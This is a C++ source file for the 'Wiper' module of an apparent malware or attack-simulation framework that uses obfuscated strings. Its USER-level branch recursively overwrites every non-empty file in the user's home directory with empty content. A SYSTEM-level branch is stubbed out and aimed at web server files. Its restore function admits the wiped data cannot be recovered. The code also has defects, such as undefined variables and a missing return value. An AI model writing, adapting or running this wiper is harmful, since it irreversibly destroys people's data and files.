#include "modules/impact/Wiper.hpp"
#include "utils/Logger.hpp"
#include "utils/CryptoUtils.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Obfuscation.hpp"
#include "core/Config.hpp"

bool WiperMethod::trigger() {
    std::string homeDir = SystemUtils::GetUserHome();

    #ifdef IMPACT_LEVEL_TEST
        std::string targetPath = homeDir + "/" + OBFL(".ghost_test");
        LOG_INFO("[TEST] Wiping files in {}", targetPath)

        if (encrypt && !std::filesystem::exists(targetPath)) {
            FileUtils::WriteFile(targetPath, "");
        }

        try {
            std::string content = FileUtils::ReadFile(targetPath);
            if (!content.empty()) {
                if (FileUtils::WriteFile(targetPath, "")) {
                    LOG_SUCCESS("Wiped {}", targetPath)
                }
            }
        } catch (const std::exception &e) {
            LOG_ERROR("Wiper failed: {}", e.what())
        }
    #elif defined(IMPACT_LEVEL_USER)
        LOG_INFO("[USER] Wiping files in {}", homeDir)

        auto files = FileUtils::ListFilesRecursively(homeDir);
        int successCount = 0;

        for (const auto& filePath : files) {
            try {
                std::string content = FileUtils::ReadFile(filePath);
                if (content.empty()) continue;

                if (FileUtils::WriteFile(filePath, "")) {
                    LOG_INFO("Wiped {}", filePath)
                    successCount++;
                }
            } catch (const std::exception& e) {
                LOG_ERROR("Failed to encrypt {}", filePath, e.what())
            }
        }
        LOG_SUCCESS("[USER] Wiper summary: wiped {} files", successCount)
    #elif defined(IMPACT_LEVEL_SYSTEM)
        std::string targetDir = OBFL("/var/www/html"); // random path for now; think through
        LOG_INFO("[SYSTEM] {} files in {}", action, targetDir)

        LOG_ALERT("TODO for now. Wiping full drive is too silly; figure out crucial files to simulate real impact in shortest time")
    #endif
}

bool WiperMethod::restore() {
    // can't feasibly restore wiped data
    // sorry... x3
    return true;
}
